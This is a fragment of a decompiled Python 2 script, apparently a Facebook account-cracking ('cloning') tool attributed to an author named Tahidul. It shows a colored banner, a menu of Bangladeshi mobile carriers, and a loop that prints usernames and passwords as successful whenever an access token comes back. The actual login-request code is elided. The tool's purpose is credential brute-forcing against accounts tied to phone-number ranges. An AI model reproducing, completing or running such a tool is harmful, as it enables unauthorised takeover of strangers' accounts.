...
os.system('clear')
psb('\x1b[1;32m -- WEALCOME TO   CLONING START PLEASE WAIT ......')
...
logo = '\x1b[1;93m--------------------------------------------------\n \x1b[1;93m  ---> Author  -> TAHIDUL  <--- \n\x1b[1;93m-------------------------------------------------- \n\x1b[1;93m     Facebook  -> Tahidul Khan  \n\x1b[1;93m--------------------------------------------------\n\x1b[1;93m  ---> Github -> tahidulkhan <--- \n\x1b[1;93m--------------------------------------------------'
...
def menu():
    ...
    print '\x1b[1;92mAUTHOR  : TAHIDUL '
    print '\x1b[1;92mFACEBOOK  : Tahidul Khan'
    print '\x1b[1;92mGITHUB  : github.com/tahidulkhan'
    print ''
    print 50* '-'
    print '\x1b[1;94m--------------------------------------------------'
    print
    ...
    print
    print '\x1b[1;92m[1]  ROBI '
    print '\x1b[1;92m[2]  AIRTEL'
    print '\x1b[1;92m[3]  BANGLALINK'
    print '\x1b[1;92m[4]  BANGLALINK'
    print '\x1b[1;92m[5]  GRAMEEN'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Tahidul-ok]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
...
if __name__ == '__main__':
    menu()
# okay decompiling Tahidul khan.pyc
